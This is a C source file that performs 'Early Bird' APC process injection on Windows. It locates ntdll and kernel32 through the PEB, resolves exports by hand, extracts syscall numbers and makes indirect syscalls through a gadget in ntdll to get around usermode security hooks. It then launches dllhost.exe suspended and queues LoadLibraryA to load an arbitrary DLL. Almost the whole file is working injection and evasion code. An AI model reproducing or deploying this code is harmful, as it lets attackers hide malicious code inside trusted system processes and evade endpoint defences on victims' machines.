/* Author: Dhanush Arvind */

#include <stdint.h>

typedef unsigned long  DWORD;
typedef unsigned short WORD;
typedef unsigned char  BYTE;
typedef void          *HANDLE;
typedef long           NTSTATUS;

typedef struct {
    DWORD  cb;
    char  *lpR, *lpD, *lpT;
    DWORD  dwX, dwY, dwXS, dwYS, dwXCC, dwYCC, dwFA, dwF;
    WORD   wSW, cbR2;
    BYTE  *lpR2;
    HANDLE hI, hO, hE;
} EB_SI;

typedef struct {
    HANDLE hP, hT;
    DWORD  pid, tid;
} EB_PI;

typedef int   (*t_CPA)(const char *, char *, void *, void *, int,
                        DWORD, void *, const char *, EB_SI *, EB_PI *);
typedef DWORD (*t_GFP)(const char *, DWORD, char *, char **);
typedef HANDLE(*t_GSH)(DWORD);
typedef int   (*t_WF)(HANDLE, const void *, DWORD, DWORD *, void *);
typedef void  (*t_EP)(unsigned int);

__attribute__((used)) static DWORD g_ssn_alloc, g_ssn_write, g_ssn_queue,
                                   g_ssn_resume, g_ssn_close;
__attribute__((used)) static void *g_gadget;

__attribute__((naked)) static NTSTATUS sc_alloc(
        HANDLE p, void **b, uint64_t z, uint64_t *s, DWORD t, DWORD pr) {
    __asm__("movq %rcx, %r10\n\t"
            "movl g_ssn_alloc(%rip), %eax\n\t"
            "jmpq *g_gadget(%rip)");
}

__attribute__((naked)) static NTSTATUS sc_write(
        HANDLE p, void *b, void *buf, uint64_t n, uint64_t *w) {
    __asm__("movq %rcx, %r10\n\t"
            "movl g_ssn_write(%rip), %eax\n\t"
            "jmpq *g_gadget(%rip)");
}

__attribute__((naked)) static NTSTATUS sc_queue(
        HANDLE t, void *fn, void *a1, void *a2, void *a3) {
    __asm__("movq %rcx, %r10\n\t"
            "movl g_ssn_queue(%rip), %eax\n\t"
            "jmpq *g_gadget(%rip)");
}

__attribute__((naked)) static NTSTATUS sc_resume_t(HANDLE t, DWORD *cnt) {
    __asm__("movq %rcx, %r10\n\t"
            "movl g_ssn_resume(%rip), %eax\n\t"
            "jmpq *g_gadget(%rip)");
}

__attribute__((naked)) static NTSTATUS sc_close_h(HANDLE h) {
    __asm__("movq %rcx, %r10\n\t"
            "movl g_ssn_close(%rip), %eax\n\t"
            "jmpq *g_gadget(%rip)");
}

static int eb_slen(const char *s) {
    int n = 0;
    while (s[n]) n++;
    return n;
}

static void eb_memset(void *d, int v, int n) {
    volatile unsigned char *p = (volatile unsigned char *)d;
    for (int i = 0; i < n; i++) p[i] = (unsigned char)v;
}

static int eb_strcmp(const char *a, const char *b) {
    while (*a && *b) {
        if (*a != *b) return 1;
        a++; b++;
    }
    return (*a || *b) ? 1 : 0;
}

static int eb_wcicmp(const WORD *w, int byte_len, const char *ascii) {
    int chars = byte_len / 2, i;
    for (i = 0; i < chars && ascii[i]; i++) {
        int a = w[i], b = (unsigned char)ascii[i];
        if (a >= 'A' && a <= 'Z') a += 32;
        if (b >= 'A' && b <= 'Z') b += 32;
        if (a != b) return 1;
    }
    return (i < chars || ascii[i]) ? 1 : 0;
}

static void *eb_get_peb(void) {
    void *peb;
    __asm__ volatile ("movq %%gs:0x60, %0" : "=r"(peb));
    return peb;
}

static void *eb_find_dll(const char *name) {
    unsigned char *peb = (unsigned char *)eb_get_peb();
    unsigned char *ldr = *(unsigned char **)(peb + 0x18);
    void **head = (void **)(ldr + 0x20);
    void **cur = (void **)*head;
    while (cur != head) {
        void *base = *(void **)((char *)cur + 0x20);
        WORD len = *(WORD *)((char *)cur + 0x48);
        WORD *buf = *(WORD **)((char *)cur + 0x50);
        if (base && buf && len > 0 && eb_wcicmp(buf, len, name) == 0)
            return base;
        cur = (void **)*cur;
    }
    return 0;
}

static void *eb_get_export(void *dll, const char *func) {
    unsigned char *b = (unsigned char *)dll;
    DWORD pe_off = *(DWORD *)(b + 0x3C);
    DWORD exp_rva = *(DWORD *)(b + pe_off + 24 + 112);
    DWORD exp_sz  = *(DWORD *)(b + pe_off + 24 + 116);
    if (!exp_rva) return 0;
    unsigned char *ed = b + exp_rva;
    DWORD n_names   = *(DWORD *)(ed + 24);
    DWORD *addr_tbl = (DWORD *)(b + *(DWORD *)(ed + 28));
    DWORD *name_tbl = (DWORD *)(b + *(DWORD *)(ed + 32));
    WORD  *ord_tbl  = (WORD  *)(b + *(DWORD *)(ed + 36));
    for (DWORD i = 0; i < n_names; i++) {
        if (eb_strcmp((char *)(b + name_tbl[i]), func) == 0) {
            DWORD rva = addr_tbl[ord_tbl[i]];
            if (rva >= exp_rva && rva < exp_rva + exp_sz) return 0;
            return b + rva;
        }
    }
    return 0;
}

static DWORD eb_get_ssn(void *func) {
    unsigned char *p = (unsigned char *)func;
    if (p[0] == 0x4C && p[1] == 0x8B && p[2] == 0xD1 && p[3] == 0xB8)
        return *(DWORD *)(p + 4);
    return 0;
}

static void *eb_find_gadget(void *ntdll) {
    unsigned char *b = (unsigned char *)ntdll;
    DWORD pe_off = *(DWORD *)(b + 0x3C);
    WORD n_sec  = *(WORD *)(b + pe_off + 6);
    WORD opt_sz = *(WORD *)(b + pe_off + 20);
    unsigned char *sec = b + pe_off + 24 + opt_sz;
    for (int i = 0; i < n_sec; i++, sec += 40) {
        if (sec[0] == '.' && sec[1] == 't' && sec[2] == 'e' &&
            sec[3] == 'x' && sec[4] == 't') {
            DWORD rva = *(DWORD *)(sec + 12);
            DWORD sz  = *(DWORD *)(sec + 8);
            unsigned char *text = b + rva;
            for (DWORD j = 0; j + 2 < sz; j++) {
                if (text[j] == 0x0F && text[j + 1] == 0x05 && text[j + 2] == 0xC3)
                    return text + j;
            }
        }
    }
    return 0;
}

int earlybird_inject(const char *dll_path) {
    void *ntdll = eb_find_dll("ntdll.dll");
    void *k32   = eb_find_dll("kernel32.dll");
    if (!ntdll || !k32) return 0;

    void *fn_a = eb_get_export(ntdll, "NtAllocateVirtualMemory");
    void *fn_w = eb_get_export(ntdll, "NtWriteVirtualMemory");
    void *fn_q = eb_get_export(ntdll, "NtQueueApcThread");
    void *fn_r = eb_get_export(ntdll, "NtResumeThread");
    void *fn_c = eb_get_export(ntdll, "NtClose");
    if (!fn_a || !fn_w || !fn_q || !fn_r || !fn_c) return 0;

    g_ssn_alloc  = eb_get_ssn(fn_a);
    g_ssn_write  = eb_get_ssn(fn_w);
    g_ssn_queue  = eb_get_ssn(fn_q);
    g_ssn_resume = eb_get_ssn(fn_r);
    g_ssn_close  = eb_get_ssn(fn_c);
    g_gadget     = eb_find_gadget(ntdll);
    if (!g_gadget) return 0;

    t_CPA pCPA = (t_CPA)eb_get_export(k32, "CreateProcessA");
    t_GFP pGFP = (t_GFP)eb_get_export(k32, "GetFullPathNameA");
    void *pLLA = eb_get_export(k32, "LoadLibraryA");
    void *pSlp = eb_get_export(k32, "Sleep");
    if (!pCPA || !pGFP || !pLLA || !pSlp) return 0;

    char abs[520];
    eb_memset(abs, 0, 520);
    pGFP(dll_path, 512, abs, (char **)0);
    int path_len = eb_slen(abs) + 1;

    EB_SI si; EB_PI pi;
    eb_memset(&si, 0, sizeof(si));
    eb_memset(&pi, 0, sizeof(pi));
    si.cb = sizeof(si);

    if (!pCPA("C:\\Windows\\System32\\dllhost.exe", (char *)0,
              (void *)0, (void *)0, 0, 0x00000004,
              (void *)0, (void *)0, &si, &pi))
        return 0;

    void *remote = (void *)0;
    uint64_t region_sz = (uint64_t)path_len;
    NTSTATUS st;

    st = sc_alloc(pi.hP, &remote, 0, &region_sz, 0x3000, 0x04);
    if (st < 0 || !remote) {
        sc_close_h(pi.hT); sc_close_h(pi.hP);
        return 0;
    }

    uint64_t written = 0;
    st = sc_write(pi.hP, remote, abs, (uint64_t)path_len, &written);
    if (st < 0) {
        sc_close_h(pi.hT); sc_close_h(pi.hP);
        return 0;
    }

    st = sc_queue(pi.hT, pLLA, remote, (void *)0, (void *)0);
    if (st < 0) {
        sc_close_h(pi.hT); sc_close_h(pi.hP);
        return 0;
    }

    sc_queue(pi.hT, pSlp, (void *)(uint64_t)0xFFFFFFFF, (void *)0, (void *)0);

    DWORD prev = 0;
    sc_resume_t(pi.hT, &prev);
    sc_close_h(pi.hT);
    sc_close_h(pi.hP);
    return 1;
}

#ifndef BUNDLED_BUILD
void _start(void) {
    void *k32 = eb_find_dll("kernel32.dll");
    t_GSH pGSH = (t_GSH)eb_get_export(k32, "GetStdHandle");
    t_WF  pWF  = (t_WF)eb_get_export(k32, "WriteFile");
    t_EP  pEP  = (t_EP)eb_get_export(k32, "ExitProcess");

    HANDLE hOut = pGSH((DWORD)-11);
    DWORD w;
    int ok = earlybird_inject("caller_inject.dll");

    if (ok) {
        const char *m = "[+] Early Bird APC injection into dllhost.exe succeeded\n";
        pWF(hOut, m, (DWORD)eb_slen(m), &w, (void *)0);
        pEP(0);
    } else {
        const char *m = "[!] Early Bird APC injection failed\n";
        pWF(hOut, m, (DWORD)eb_slen(m), &w, (void *)0);
        pEP(1);
    }
}
#endif
